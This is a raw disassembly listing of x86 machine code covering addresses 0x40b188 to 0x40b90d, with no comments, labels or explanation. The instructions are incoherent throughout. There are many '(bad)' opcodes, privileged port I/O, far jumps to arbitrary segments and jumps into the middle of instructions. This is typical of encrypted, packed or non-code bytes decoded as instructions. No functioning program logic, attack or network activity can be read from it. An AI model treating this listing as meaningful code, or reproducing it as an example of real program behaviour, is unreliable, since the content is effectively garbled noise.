  40b188:	jne    0x40b1f3
  40b18a:	nop
  40b18b:	or     edx,eax
  40b18d:	dec    eax
  40b18f:	rol    DWORD PTR [edi-0x275f121c],0x84
  40b196:	les    edi,FWORD PTR [esi+0x39610f37]
  40b19c:	adc    edx,0xad32ac8e
  40b1a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1a3:	and    edx,ebx
  40b1a5:	inc    edi
  40b1a6:	mov    bh,0xf1
  40b1a8:	xchg   esp,eax
  40b1a9:	fldenv [esi+ebp*4]
  40b1ac:	sbb    edi,0x1d
  40b1af:	xchg   edi,eax
  40b1b0:	jae    0x40b1f6
  40b1b2:	dec    esi
  40b1b3:	sti    
  40b1b4:	imul   ebp,DWORD PTR [ebx-0x64],0x64
  40b1b8:	push   esp
  40b1b9:	jmp    0x40b1be
  40b1bb:	repnz add ecx,eax
  40b1be:	aas    
  40b1bf:	in     al,0xcf
  40b1c1:	cmp    BYTE PTR cs:[esi-0x64],0x90
  40b1c6:	and    ebp,DWORD PTR [edi+0x31]
  40b1c9:	push   ebp
  40b1ca:	aas    
  40b1cb:	fwait
  40b1cc:	adc    eax,0x3820ab2a
  40b1d1:	or     esi,ebx
  40b1d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d4:	mov    ebx,0x6ba9af97
  40b1d9:	shl    DWORD PTR [ebp+0x30be8962],1
  40b1df:	add    edx,DWORD PTR [ecx+0x2cd2bde]
  40b1e5:	repz test DWORD PTR ds:0x70bc4675,eax
  40b1ec:	mov    BYTE PTR [edi],al
  40b1ee:	push   ebx
  40b1ef:	jmp    0x3944:0x628d8b5e
  40b1f6:	xchg   DWORD PTR [ebx-0x5ed2b2bb],esp
  40b1fc:	and    al,0x94
  40b1fe:	cdq    
  40b1ff:	dec    eax
  40b200:	mov    dh,0xa2
  40b202:	ins    BYTE PTR es:[edi],dx
  40b203:	adc    esi,DWORD PTR [ecx+esi*4-0xf]
  40b207:	cmp    eax,0x7173005
  40b20c:	lods   al,BYTE PTR ds:[esi]
  40b20d:	sbb    eax,0x9f1282ae
  40b212:	pop    es
  40b213:	into   
  40b214:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b215:	add    eax,0x2ad6796c
  40b21a:	sar    DWORD PTR [edx],0xca
  40b21d:	xlat   BYTE PTR ds:[ebx]
  40b21e:	and    BYTE PTR [edi],0x4c
  40b221:	ins    BYTE PTR es:[edi],dx
  40b222:	push   0x9d0cae74
  40b227:	xchg   ecx,eax
  40b228:	test   BYTE PTR [ebp+0x0],0xe2
  40b22c:	das    
  40b22d:	inc    esi
  40b22e:	mov    bl,0x1b
  40b230:	xchg   edx,eax
  40b231:	add    ch,BYTE PTR [eax-0x2f]
  40b234:	repz mov edx,0xcc9796e6
  40b23a:	xchg   ebx,eax
  40b23b:	or     al,0xd
  40b23d:	aas    
  40b23e:	cs mov esp,0xe49b9aae
  40b244:	jbe    0x40b285
  40b246:	sbb    DWORD PTR [edx],esi
  40b248:	dec    ecx
  40b249:	mov    cl,0xf7
  40b24b:	add    al,0x9
  40b24d:	in     al,dx
  40b24e:	ficomp DWORD PTR [ebp-0x7bea0ed5]
  40b254:	lods   eax,DWORD PTR ds:[esi]
  40b255:	push   0xffffff9a
  40b257:	jp     0x40b258
  40b259:	loope  0x40b2b6
  40b25b:	retf   0xd5b9
  40b25e:	or     al,0x8f
  40b260:	out    0xd9,al
  40b262:	pop    ecx
  40b263:	nop
  40b264:	add    eax,ecx
  40b266:	dec    edi
  40b267:	inc    edx
  40b268:	arpl   WORD PTR [edi],dx
  40b26a:	pop    eax
  40b26b:	xchg   ebx,eax
  40b26c:	repnz mov ch,0xba
  40b26f:	sbb    DWORD PTR [ecx+0x4a],ebx
  40b272:	into   
  40b273:	mov    edi,0x9b829093
  40b278:	adc    dl,BYTE PTR [edi]
  40b27a:	and    BYTE PTR [eax-0x5b],dh
  40b27d:	ins    BYTE PTR es:[edi],dx
  40b27e:	pop    eax
  40b27f:	jmp    0x40b2a6
  40b281:	jb     0x40b281
  40b283:	aad    0x5a
  40b285:	pop    ebx
  40b286:	je     0x40b238
  40b288:	or     al,0x94
  40b28a:	and    eax,ecx
  40b28c:	and    BYTE PTR [esi-0x75],dh
  40b28f:	cdq    
  40b290:	jmp    0x4f34972b
  40b295:	fst    QWORD PTR [edx+0x6c67cbf5]
  40b29b:	jecxz  0x40b2d1
  40b29d:	add    DWORD PTR [ebx+0x75],edi
  40b2a0:	fnsave [edi]
  40b2a2:	cmp    ecx,DWORD PTR [ecx]
  40b2a4:	in     al,dx
  40b2a5:	inc    ebp
  40b2a6:	lahf   
  40b2a7:	popf   
  40b2a8:	leave  
  40b2a9:	dec    edi
  40b2aa:	sar    ebx,0x68
  40b2ad:	jp     0x40b32a
  40b2af:	add    eax,0xdc559b71
  40b2b4:	mov    dl,0x9e
  40b2b6:	cs mov dl,0x11
  40b2b9:	sub    esp,ecx
  40b2bb:	cmp    DWORD PTR [edi],ebp
  40b2bd:	cmp    bh,ch
  40b2bf:	pushf  
  40b2c0:	push   eax
  40b2c1:	pop    edi
  40b2c2:	push   ecx
  40b2c3:	sbb    esp,DWORD PTR [ebx+eiz*8-0x372f8946]
  40b2ca:	mov    esp,0xf97f13ac
  40b2cf:	inc    ebp
  40b2d0:	ja     0x40b291
  40b2d2:	sub    eax,0x878f39a2
  40b2d7:	sub    eax,0xdd66ca03
  40b2dc:	cwde   
  40b2dd:	or     edx,esp
  40b2df:	ror    DWORD PTR [esi-0x9fa4347],1
  40b2e5:	cmp    al,BYTE PTR [esi+0x25]
  40b2e8:	inc    BYTE PTR [ecx+0x39]
  40b2eb:	test   eax,0x86dbeff
  40b2f0:	cli    
  40b2f1:	or     al,0x67
  40b2f3:	mul    DWORD PTR [edx+0x249a256]
  40b2f9:	xchg   ecx,eax
  40b2fa:	adc    ebx,DWORD PTR [ebx+0x264dd2da]
  40b300:	stos   BYTE PTR es:[edi],al
  40b301:	mov    dl,BYTE PTR [ebp-0x39349e90]
  40b307:	xlat   BYTE PTR ds:[ebx]
  40b308:	repz xor al,0x89
  40b30b:	xchg   ch,ch
  40b30d:	jg     0x40b386
  40b30f:	push   eax
  40b310:	dec    ebp
  40b311:	inc    edi
  40b312:	and    dh,BYTE PTR [ebx+0x8547aca]
  40b318:	cwde   
  40b319:	scas   al,BYTE PTR es:[edi]
  40b31a:	or     DWORD PTR [esi],0x1b59bad1
  40b320:	(bad)
  40b323:	ins    DWORD PTR es:[edi],dx
  40b324:	call   0x5f1495e
  40b329:	dec    eax
  40b32a:	dec    ebp
  40b32b:	imul   eax,DWORD PTR [edi+ecx*8+0x5aca3101],0x5f
  40b333:	in     eax,dx
  40b334:	sbb    DWORD PTR [eax],0x67
  40b337:	sub    al,0xb7
  40b339:	cmp    BYTE PTR [edi],ah
  40b33b:	adc    al,0x1d
  40b33d:	call   0xffc:0x8120bc62
  40b344:	cld    
  40b345:	cwde   
  40b346:	sub    BYTE PTR [eax+0x1320053e],ch
  40b34c:	push   0xffffffe7
  40b34e:	(bad)
  40b351:	dec    esi
  40b352:	rcl    DWORD PTR [esi],1
  40b354:	dec    ecx
  40b355:	retf   0x10b4
  40b358:	and    eax,0x7a2d6677
  40b35d:	lock mov cl,0x85
  40b360:	cmp    esp,DWORD PTR [ebx]
  40b362:	pop    ss
  40b363:	mov    esp,0xd84cb7dc
  40b368:	lods   al,BYTE PTR ds:[esi]
  40b369:	shr    BYTE PTR [edi+0x51],0x94
  40b36d:	jmp    0x40b374
  40b36f:	call   FWORD PTR [ecx+0x1]
  40b372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b373:	and    dh,dl
  40b375:	js     0x40b344
  40b377:	add    ch,BYTE PTR [eax-0x2ae82df6]
  40b37d:	cmp    al,0xff
  40b37f:	and    esp,DWORD PTR [ecx]
  40b381:	fcom   DWORD PTR [eax+ebp*2+0x70]
  40b385:	inc    edx
  40b386:	test   bl,dl
  40b388:	(bad)  
  40b389:	inc    esi
  40b38a:	push   0xd188b4d1
  40b38f:	out    dx,eax
  40b390:	or     eax,0x8b845914
  40b395:	mov    dl,0x35
  40b397:	aad    0xad
  40b399:	xor    edi,edx
  40b39b:	xchg   ecx,eax
  40b39c:	push   0x5fed4a5f
  40b3a1:	in     al,0xfd
  40b3a3:	cmp    DWORD PTR [esi+eiz*1-0x51],edi
  40b3a7:	add    dh,bh
  40b3a9:	xchg   esi,eax
  40b3aa:	outs   dx,DWORD PTR ds:[esi]
  40b3ab:	xchg   ebx,eax
  40b3ac:	call   0xb7fe:0xe4d16887
  40b3b3:	in     eax,0x47
  40b3b5:	stc    
  40b3b6:	adc    al,0x7f
  40b3b8:	or     al,0x3c
  40b3ba:	std    
  40b3bb:	sub    DWORD PTR [eax+esi*1+0x24],esp
  40b3bf:	cdq    
  40b3c0:	jp     0x40b402
  40b3c2:	gs in  al,dx
  40b3c4:	iret   
  40b3c5:	jge    0x40b3cc
  40b3c7:	push   ss
  40b3c8:	nop
  40b3c9:	shl    edx,0x4b
  40b3cc:	or     al,0x3a
  40b3ce:	pop    ebp
  40b3cf:	push   eax
  40b3d0:	inc    esp
  40b3d1:	dec    ebx
  40b3d2:	jbe    0x40b39c
  40b3d4:	push   edx
  40b3d5:	push   cs
  40b3d6:	dec    ecx
  40b3d7:	clc    
  40b3d8:	push   DWORD PTR [ecx+0x72]
  40b3db:	int3   
  40b3dc:	fs xor al,0x3b
  40b3df:	sbb    BYTE PTR [edi],cl
  40b3e1:	sub    BYTE PTR [edi],cl
  40b3e3:	jp     0x40b41a
  40b3e5:	dec    eax
  40b3e6:	movups xmm3,XMMWORD PTR [ebx-0x37]
  40b3ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3eb:	stc    
  40b3ec:	retf   
  40b3ed:	inc    ebx
  40b3ee:	repz inc ebx
  40b3f0:	jmp    0x40b3a6
  40b3f2:	jecxz  0x40b3ce
  40b3f4:	outs   dx,BYTE PTR ds:[esi]
  40b3f5:	jecxz  0x40b3ad
  40b3f7:	fwait
  40b3f8:	jne    0x40b422
  40b3fa:	fist   WORD PTR [ebp-0x3b9f5]
  40b400:	loop   0x40b43d
  40b402:	pop    ebp
  40b403:	push   edi
  40b404:	sti    
  40b405:	inc    esp
  40b406:	pop    ecx
  40b407:	jns    0x40b441
  40b409:	sub    DWORD PTR [ebx+0x18],esi
  40b40c:	std    
  40b40d:	adc    bh,dl
  40b40f:	pop    ecx
  40b410:	(bad)  
  40b411:	mov    ch,0x5c
  40b413:	loope  0x40b3e8
  40b415:	iret   
  40b416:	in     al,0xfb
  40b418:	mov    BYTE PTR [edi],al
  40b41a:	jo     0x40b44c
  40b41c:	add    esi,esp
  40b41e:	loopne 0x40b446
  40b420:	push   ds
  40b421:	aad    0xe2
  40b423:	retf   0xcc7b
  40b426:	jb     0x40b44e
  40b428:	cwde   
  40b429:	mov    esp,0x32c9304c
  40b42e:	dec    ecx
  40b42f:	xor    cl,BYTE PTR [ecx-0x7a0ea034]
  40b435:	inc    esi
  40b436:	pusha  
  40b437:	push   0x4898e411
  40b43c:	aad    0x2d
  40b43e:	in     eax,0x83
  40b440:	sbb    eax,0x68f639de
  40b445:	mov    al,cl
  40b447:	ret    0x6f08
  40b44a:	sbb    al,0xee
  40b44c:	popf   
  40b44d:	outs   dx,BYTE PTR ds:[esi]
  40b44e:	dec    ecx
  40b44f:	es adc ch,dh
  40b452:	stc    
  40b453:	(bad)  
  40b455:	dec    esp
  40b456:	fcmovnu st,st(4)
  40b458:	jbe    0x40b4d8
  40b45a:	ret    0x8924
  40b45d:	js     0x40b476
  40b45f:	mov    ebp,0x929f3825
  40b464:	mov    fs,WORD PTR [ebp-0x1f]
  40b467:	stos   BYTE PTR es:[edi],al
  40b468:	lahf   
  40b469:	stos   BYTE PTR es:[edi],al
  40b46a:	call   0x1983d4c0
  40b46f:	or     cl,ah
  40b471:	mov    esp,0x22da7db8
  40b476:	cmp    al,0x5c
  40b478:	sub    BYTE PTR [esi+0x7210eedd],dl
  40b47e:	xchg   edx,eax
  40b47f:	not    DWORD PTR [ebp-0x2a201189]
  40b485:	dec    edx
  40b486:	sti    
  40b487:	mov    cl,0xc2
  40b489:	sbb    BYTE PTR [esi+0x67],ch
  40b48c:	shl    BYTE PTR [esi-0x576438d],cl
  40b492:	out    dx,eax
  40b493:	outs   dx,DWORD PTR ds:[esi]
  40b494:	test   al,dl
  40b496:	pop    ds
  40b497:	lea    edx,[ebx+0xc]
  40b49a:	out    0x7c,eax
  40b49c:	push   edi
  40b49d:	mov    BYTE PTR [ebp+edi*8-0x4f],bh
  40b4a1:	inc    esp
  40b4a2:	(bad)  
  40b4a3:	aas    
  40b4a4:	cmp    al,0x95
  40b4a6:	aam    0xaa
  40b4a8:	inc    edi
  40b4a9:	cld    
  40b4aa:	inc    esi
  40b4ab:	cwde   
  40b4ac:	(bad)  
  40b4ad:	cld    
  40b4ae:	add    ecx,esp
  40b4b0:	mov    ds,ebx
  40b4b2:	aaa    
  40b4b3:	and    esi,DWORD PTR [ebp+0x203eb2e8]
  40b4b9:	test   al,0x19
  40b4bb:	inc    esi
  40b4bc:	mov    ch,0xc5
  40b4be:	(bad)  
  40b4bf:	loope  0x40b46f
  40b4c1:	inc    ebp
  40b4c2:	loopne 0x40b496
  40b4c4:	into   
  40b4c5:	call   0x6f3d978b
  40b4ca:	int    0x4b
  40b4cc:	and    ebx,DWORD PTR [esi+0x70]
  40b4cf:	sub    DWORD PTR [edi+0x3d],esi
  40b4d2:	in     al,0x1d
  40b4d4:	xchg   edi,eax
  40b4d5:	and    eax,0x3884347c
  40b4da:	inc    esp
  40b4db:	addr16 out 0x0,eax
  40b4de:	int3   
  40b4df:	dec    edx
  40b4e0:	add    ebp,DWORD PTR [ecx]
  40b4e2:	pushf  
  40b4e3:	call   0x31d3:0xb75bf9c6
  40b4ea:	jmp    DWORD PTR ds:0xac211bf0
  40b4f0:	add    esi,DWORD PTR [ebp+0x51fdd07f]
  40b4f6:	inc    ebp
  40b4f7:	lahf   
  40b4f8:	retf   0xfe26
  40b4fb:	shl    ch,1
  40b4fd:	leave  
  40b4fe:	jg     0x40b4f8
  40b500:	push   ds
  40b501:	iret   
  40b502:	je     0x40b55a
  40b504:	xor    eax,0x9c63c405
  40b509:	push   ebx
  40b50a:	sbb    bl,dh
  40b50c:	fild   WORD PTR [edi+0x31]
  40b50f:	(bad)  
  40b510:	fstp   DWORD PTR [edx+ebp*4+0x7c78003f]
  40b517:	imul   ebx,DWORD PTR [eax],0xffffffe0
  40b51a:	jae    0x40b504
  40b51c:	xchg   edi,eax
  40b51d:	push   es
  40b51e:	or     bl,BYTE PTR [eax+0x60]
  40b521:	into   
  40b522:	cmp    dh,BYTE PTR [ebp+0x4a8c6ac0]
  40b528:	xchg   DWORD PTR [esi-0x1d],eax
  40b52b:	mov    bh,0xc1
  40b52d:	inc    edi
  40b52e:	popf   
  40b52f:	and    cl,BYTE PTR ds:0xa1a2fa4
  40b535:	test   edx,0x37014aeb
  40b53b:	jmp    0x4145:0x3e556b9
  40b542:	xor    DWORD PTR [esi+0x6a1e2613],0xffffffda
  40b549:	in     eax,dx
  40b54a:	mov    esp,0xa5857eff
  40b54f:	loop   0x40b584
  40b551:	xor    ah,al
  40b553:	in     eax,0xfe
  40b555:	add    ecx,edx
  40b557:	or     ebp,DWORD PTR [edx]
  40b559:	xchg   esp,eax
  40b55a:	push   ss
  40b55b:	(bad)  
  40b55c:	push   ds
  40b55d:	push   0x7c
  40b55f:	mov    eax,0xc35ecce
  40b564:	mov    dl,0x4d
  40b566:	adc    esi,0x22
  40b569:	std    
  40b56a:	jnp    0x40b575
  40b56c:	dec    esp
  40b56d:	repnz std 
  40b56f:	xor    ebx,ebx
  40b571:	push   edx
  40b572:	cmp    al,0x33
  40b574:	cwde   
  40b575:	lock inc edi
  40b577:	test   BYTE PTR [eax-0x38bb7e70],dh
  40b57d:	xchg   ebp,eax
  40b57e:	pop    eax
  40b57f:	jnp    0x40b55a
  40b581:	outs   dx,BYTE PTR ds:[esi]
  40b582:	push   esi
  40b583:	inc    edx
  40b584:	stos   BYTE PTR es:[edi],al
  40b585:	(bad)  [edx-0x567e50ec]
  40b58b:	inc    eax
  40b58c:	xchg   esp,eax
  40b58d:	add    dl,ch
  40b58f:	pop    ebx
  40b590:	add    al,0xa3
  40b592:	cmc    
  40b593:	lods   eax,DWORD PTR ds:[esi]
  40b594:	ficomp WORD PTR [ecx+0x501a3fb]
  40b59a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b59b:	push   ecx
  40b59c:	xor    al,BYTE PTR [ecx]
  40b59e:	push   0xffffffd0
  40b5a0:	(bad)  
  40b5a1:	outs   dx,BYTE PTR ds:[esi]
  40b5a2:	imul   edx,DWORD PTR [eax],0xffffffc1
  40b5a5:	jnp    0x40b5e7
  40b5a7:	mov    edx,0x8b996bd5
  40b5ac:	cdq    
  40b5ad:	out    dx,al
  40b5ae:	test   eax,0x51f543bb
  40b5b3:	push   ebp
  40b5b4:	retf   
  40b5b5:	pop    edx
  40b5b6:	mov    ds:0xd0fe9242,al
  40b5bb:	ret    
  40b5bc:	test   BYTE PTR [ebp+0x5ae938e0],0x1d
  40b5c3:	pop    esp
  40b5c4:	(bad)  
  40b5c6:	(bad)  
  40b5c7:	and    al,0x23
  40b5c9:	add    edx,0xa73f1aa7
  40b5cf:	sbb    al,0x1e
  40b5d1:	push   0x4a
  40b5d3:	dec    esp
  40b5d4:	sbb    ch,BYTE PTR [ebx]
  40b5d6:	mov    bh,0xc3
  40b5d8:	pushf  
  40b5d9:	scas   eax,DWORD PTR es:[edi]
  40b5da:	dec    eax
  40b5db:	pop    edx
  40b5dc:	jecxz  0x40b571
  40b5de:	pop    edi
  40b5df:	icebp  
  40b5e0:	fsubr  DWORD PTR [ebx]
  40b5e2:	jnp    0x40b5b6
  40b5e4:	dec    esi
  40b5e5:	out    0x73,eax
  40b5e7:	mov    ecx,0x72d11991
  40b5ec:	js     0x40b60b
  40b5ee:	push   edx
  40b5ef:	out    dx,eax
  40b5f0:	push   cs
  40b5f1:	cmp    eax,ebp
  40b5f3:	push   ebp
  40b5f4:	sbb    ecx,edi
  40b5f6:	pop    ebx
  40b5f7:	popf   
  40b5f8:	mov    eax,0x2a4f22d2
  40b5fd:	ins    BYTE PTR es:[edi],dx
  40b5fe:	dec    esp
  40b5ff:	push   ss
  40b600:	aad    0x19
  40b602:	into   
  40b603:	pop    ecx
  40b604:	pop    edi
  40b605:	nop
  40b606:	inc    edx
  40b607:	test   BYTE PTR [esi+0x50],cl
  40b60a:	(bad)  
  40b60b:	in     eax,0x4c
  40b60d:	sub    eax,0xd541656
  40b612:	and    DWORD PTR [edx-0x297be351],edx
  40b618:	popf   
  40b619:	push   0xffffff9a
  40b61b:	sub    DWORD PTR [eax+0x72312aee],edx
  40b621:	push   0xfffffffb
  40b623:	repz (bad) 
  40b625:	or     BYTE PTR [ebp+0x1d],bl
  40b628:	ret    0x79ac
  40b62b:	retf   0x2d9c
  40b62e:	mov    ecx,0x30501a2
  40b633:	daa    
  40b634:	push   esp
  40b635:	xor    edx,DWORD PTR [ecx]
  40b637:	mov    ds,WORD PTR [edx-0x389b7d1]
  40b63d:	mov    ds:0xff0bef39,al
  40b642:	xor    eax,DWORD PTR ds:0x8f732e4f
  40b648:	push   ebp
  40b649:	sbb    ebx,edx
  40b64b:	jmp    0x3b2:0xc29d1495
  40b652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b653:	int    0xdd
  40b655:	and    al,0xf4
  40b657:	add    eax,0xf3eeb0f7
  40b65c:	adc    DWORD PTR [eax-0x4],edi
  40b65f:	xchg   ecx,eax
  40b660:	daa    
  40b661:	adc    eax,DWORD PTR [eax-0x2ad964c6]
  40b667:	call   0x3026:0x89372e0f
  40b66e:	mov    gs:0x7e071a3a,al
  40b674:	push   ecx
  40b675:	hlt    
  40b676:	arpl   WORD PTR [ecx-0x31],sp
  40b679:	aad    0xb9
  40b67b:	mov    ecx,0x776ae5d5
  40b680:	aaa    
  40b681:	xchg   ebp,eax
  40b682:	sahf   
  40b683:	mov    esi,0x6c1698e6
  40b688:	add    ah,dl
  40b68a:	dec    ebp
  40b68b:	imul   esi,edx,0xffffffd2
  40b68e:	imul   ebp,DWORD PTR [edi],0xe1b07a21
  40b694:	test   eax,0xe86493fe
  40b699:	dec    eax
  40b69a:	pop    ds
  40b69b:	jmp    0x40b67d
  40b69d:	mov    ah,0xd1
  40b69f:	stos   DWORD PTR es:[edi],eax
  40b6a0:	imul   edx,DWORD PTR [edi+0x6d760f1c],0xffffffae
  40b6a7:	pop    ebx
  40b6a8:	std    
  40b6a9:	and    al,0x62
  40b6ab:	ficom  WORD PTR [eax+0x3d74e755]
  40b6b1:	mov    ch,BYTE PTR [edx]
  40b6b3:	neg    BYTE PTR [ecx-0x1c]
  40b6b6:	shr    DWORD PTR [ecx-0x3017e09d],cl
  40b6bc:	pop    ecx
  40b6bd:	mov    ds:0x52e730cc,eax
  40b6c2:	mov    edx,0x61658cc0
  40b6c7:	push   esp
  40b6c8:	out    dx,eax
  40b6c9:	iret   
  40b6ca:	mov    ah,0x44
  40b6cc:	std    
  40b6cd:	mov    DWORD PTR [edi-0x6b],0x867d1d52
  40b6d4:	mov    DWORD PTR [esi],esp
  40b6d6:	add    eax,0x94919d76
  40b6db:	xchg   BYTE PTR [edx-0x63ea0616],dl
  40b6e1:	add    DWORD PTR [esi+eax*1-0x497baee3],ebp
  40b6e8:	or     dh,al
  40b6ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6eb:	mov    dh,dh
  40b6ed:	lds    ebx,FWORD PTR [edi+0x7fcf2bc2]
  40b6f3:	arpl   WORD PTR [eax+0x5f491523],bx
  40b6f9:	jmp    0x60b16c44
  40b6fe:	mov    bl,0x82
  40b700:	mov    DWORD PTR [esi-0x53153dfa],esi
  40b706:	(bad)  
  40b707:	les    edx,FWORD PTR [edx]
  40b709:	pop    ds
  40b70a:	lds    ebx,FWORD PTR [ebp+0x66e54a36]
  40b710:	mov    edx,0x265ce8dd
  40b715:	cli    
  40b716:	inc    ecx
  40b717:	mov    ebp,0x12f428b1
  40b71c:	and    BYTE PTR [ebx+esi*4],dh
  40b71f:	xchg   edi,eax
  40b720:	pop    ebx
  40b721:	inc    esp
  40b722:	test   ch,ch
  40b724:	leave  
  40b725:	shr    DWORD PTR [eax+eiz*1],cl
  40b728:	test   esp,esi
  40b72a:	(bad)  
  40b72b:	mov    ebx,0x20947ef6
  40b730:	and    DWORD PTR [ecx],edx
  40b732:	mov    dl,0x7
  40b734:	jo     0x40b719
  40b736:	adc    eax,0x8ae63325
  40b73b:	addr16 mov ds:0x4214,al
  40b73f:	out    0xde,al
  40b741:	cmp    eax,0x33ef5ed7
  40b746:	add    al,0x30
  40b748:	repnz or DWORD PTR [ebp+0xc],esp
  40b74c:	xchg   BYTE PTR [edi+0x6f9993ec],al
  40b752:	adc    BYTE PTR [esi],dl
  40b754:	xchg   ebx,eax
  40b755:	inc    esp
  40b756:	push   ss
  40b757:	(bad)  
  40b758:	pop    ebx
  40b759:	sub    al,0x2c
  40b75b:	or     DWORD PTR [esi+0x14],ebx
  40b75e:	clc    
  40b75f:	sti    
  40b760:	fmul   DWORD PTR [edx-0x32]
  40b763:	pusha  
  40b764:	imul   ebp,DWORD PTR [esi+0x64083d72],0xd7ada89b
  40b76e:	fnstcw WORD PTR [edx+0x50]
  40b771:	push   esi
  40b772:	push   ecx
  40b773:	mov    esp,0x99973e43
  40b778:	dec    ecx
  40b779:	ds inc ecx
  40b77b:	push   0x8ac3b949
  40b780:	clc    
  40b781:	jge    0x40b7a7
  40b783:	adc    esi,0x5464ba04
  40b789:	leave  
  40b78a:	mov    ds,WORD PTR ds:0x195bd337
  40b790:	mov    ah,0x6a
  40b792:	div    BYTE PTR [edi+0x64400c4c]
  40b798:	mov    esp,0x41cdee36
  40b79d:	ret    0x35e7
  40b7a0:	out    dx,al
  40b7a1:	mov    eax,0x44867b07
  40b7a6:	add    eax,ecx
  40b7a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a9:	(bad)
  40b7ac:	mov    DWORD PTR [ebp+0x6897e7b6],esi
  40b7b2:	push   0x2b
  40b7b4:	dec    ebp
  40b7b5:	push   edx
  40b7b6:	and    eax,0xda686712
  40b7bb:	xchg   esi,eax
  40b7bc:	pop    esi
  40b7bd:	std    
  40b7be:	in     eax,dx
  40b7bf:	or     ch,bh
  40b7c1:	jb     0x40b764
  40b7c3:	cmp    DWORD PTR [eax-0x39253888],esi
  40b7c9:	push   ss
  40b7ca:	mov    ebp,0x6bfb410c
  40b7cf:	jmp    0x693f:0xa22f5a97
  40b7d6:	dec    eax
  40b7d7:	add    BYTE PTR [esi-0x4dace1c2],0x5f
  40b7de:	sbb    dh,bl
  40b7e0:	fldenv [edx-0x23c1a836]
  40b7e6:	lods   al,BYTE PTR ds:[esi]
  40b7e7:	gs cld 
  40b7e9:	cwde   
  40b7ea:	dec    edi
  40b7eb:	sbb    al,0xad
  40b7ed:	lahf   
  40b7ee:	addr16 xor al,0x21
  40b7f1:	pop    ss
  40b7f2:	stos   DWORD PTR es:[edi],eax
  40b7f3:	jmp    0x40b850
  40b7f5:	mov    gs,WORD PTR [edi+ebx*2+0x56]
  40b7f9:	and    al,0x38
  40b7fb:	mov    bl,0xdc
  40b7fd:	pop    esp
  40b7fe:	sub    eax,0x66b7a429
  40b803:	jmp    0x799d:0x2e71942b
  40b80a:	call   0x41399485
  40b80f:	jmp    0x6225f388
  40b814:	add    DWORD PTR [ebx],0x4
  40b817:	mov    ebx,0x5664697
  40b81c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b81d:	xor    BYTE PTR [eax-0x1f0b73de],0x58
  40b824:	outs   dx,DWORD PTR ds:[esi]
  40b825:	repz add eax,0xf08a9aea
  40b82b:	mov    DWORD PTR [esi-0x57],ebp
  40b82e:	inc    ebp
  40b82f:	inc    ecx
  40b830:	mov    dh,BYTE PTR [esi-0x24b73fc4]
  40b836:	hlt    
  40b837:	inc    edx
  40b838:	pop    ecx
  40b839:	mov    esi,DWORD PTR [eax-0x10]
  40b83c:	mov    WORD PTR [edi+0x271786b9],fs
  40b842:	(bad)  
  40b844:	ins    BYTE PTR es:[edi],dx
  40b845:	dec    eax
  40b846:	jnp    0x40b81c
  40b848:	pop    eax
  40b849:	push   ebx
  40b84a:	push   ecx
  40b84b:	xor    edi,DWORD PTR [ebx+edi*4-0x36]
  40b84f:	jmp    0x1a226c4b
  40b854:	jecxz  0x40b865
  40b856:	popf   
  40b857:	jge    0x40b861
  40b859:	push   es
  40b85a:	pop    ecx
  40b85b:	aaa    
  40b85c:	test   BYTE PTR [ecx],al
  40b85e:	adc    DWORD PTR [eax+0x3f7b9877],ecx
  40b864:	stos   BYTE PTR es:[edi],al
  40b865:	fimul  WORD PTR [ecx+ecx*8]
  40b868:	add    al,0xa0
  40b86a:	jecxz  0x40b816
  40b86c:	xchg   ch,dh
  40b86e:	mov    ah,0x8f
  40b870:	sbb    DWORD PTR [edi],esi
  40b872:	fstp   st(0)
  40b874:	jne    0x40b8e4
  40b876:	loope  0x40b835
  40b878:	sub    BYTE PTR [eax],dh
  40b87a:	les    ebx,FWORD PTR [edi-0x63]
  40b87d:	mov    DWORD PTR [edx+0x2f],ecx
  40b880:	sti    
  40b881:	jg     0x40b8b6
  40b883:	cmp    BYTE PTR [eax+0x33],0x85
  40b887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b888:	mov    bl,0x41
  40b88a:	inc    ebx
  40b88b:	fadd   st,st(5)
  40b88d:	pop    esp
  40b88e:	sub    ah,BYTE PTR [eax-0x45e1dba5]
  40b894:	jne    0x40b8d4
  40b896:	push   ebx
  40b897:	idiv   ah
  40b899:	in     eax,dx
  40b89a:	dec    DWORD PTR [edi]
  40b89c:	mov    edi,0x11c7703b
  40b8a1:	pop    edx
  40b8a2:	xor    DWORD PTR [esi+0x7d],edx
  40b8a5:	sbb    ch,bh
  40b8a7:	xchg   BYTE PTR [edx+0x33],bl
  40b8aa:	mov    esp,0xb5d2336b
  40b8af:	mov    ds:0xa2070857,al
  40b8b4:	push   esp
  40b8b5:	sub    BYTE PTR [ecx],al
  40b8b7:	js     0x40b8fc
  40b8b9:	call   0xa46:0xae210cdd
  40b8c0:	mov    ebp,0x3b733adc
  40b8c5:	and    BYTE PTR [ecx],al
  40b8c7:	inc    ebx
  40b8c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8c9:	mov    edi,0xffaa02a9
  40b8ce:	mov    dh,0xea
  40b8d0:	(bad)  
  40b8d2:	popa   
  40b8d3:	jno    0x40b8f0
  40b8d5:	popa   
  40b8d6:	sub    DWORD PTR [ecx],0xffffff87
  40b8d9:	js     0x40b937
  40b8db:	push   esi
  40b8dc:	ja     0x40b90d
  40b8de:	and    eax,0xffffffc5
  40b8e1:	dec    edi
  40b8e2:	cld    
  40b8e3:	je     0x40b959
  40b8e5:	inc    ebx
  40b8e6:	xor    DWORD PTR [ecx*4-0x30d90f68],0x14fdc446
  40b8f1:	sub    eax,0x3cff6488
  40b8f6:	mov    al,ds:0x1eb53051
  40b8fb:	jbe    0x40b88e
  40b8fd:	add    dh,BYTE PTR [esp+eax*4-0x2]
  40b901:	xor    dl,ah
  40b903:	mov    bh,BYTE PTR [ecx-0x3ed99f8c]
  40b909:	pop    edi
  40b90a:	lods   al,BYTE PTR ds:[esi]
  40b90b:	mov    ah,0x5b
  40b90d:	aaa    
